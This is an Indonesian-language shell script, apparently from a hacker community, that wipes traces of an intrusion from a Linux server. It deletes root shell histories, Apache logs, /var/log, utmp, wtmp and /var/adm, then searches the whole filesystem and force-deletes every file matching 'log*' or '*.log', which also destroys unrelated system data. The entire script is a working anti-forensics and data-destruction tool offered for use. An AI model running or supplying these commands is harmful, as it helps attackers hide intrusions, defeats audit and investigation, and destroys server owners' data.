#!/bin/sh 
#################################################
############# Coded By Tukang Sapu  #############
### Gr33tz : All Members Of Hacker Community ####
## chmod 0755 sapubersih.sh >> ./sapubersih.sh ##
#################################################

echo "[*] Sapu Bersih Log di Server... "
rm -rf /tmp/logs
rm -rf $HISTFILE
rm -rf /root/.ksh_history
rm -rf /root/.bash_history
rm -rf /root/.ksh_history
rm -rf /root/.bash_logout 
rm -rf /usr/local/apache/logs
rm -rf /usr/local/apache/log
rm -rf /var/apache/logs
rm -rf /var/apache/log
rm -rf /var/run/utmp
rm -rf /var/logs
rm -rf /var/log
rm -rf /var/adm
rm -rf /etc/wtmp
rm -rf /etc/utmp
find / -name *.bash_history -exec rm -rf {} \;
find / -name *.bash_logout -exec rm -rf {} \;
find / -name "log*" -exec rm -rf {} \;
find / -name *.log -exec rm -rf {} \;
echo "[*] Sudah disapu bersih... ;)" 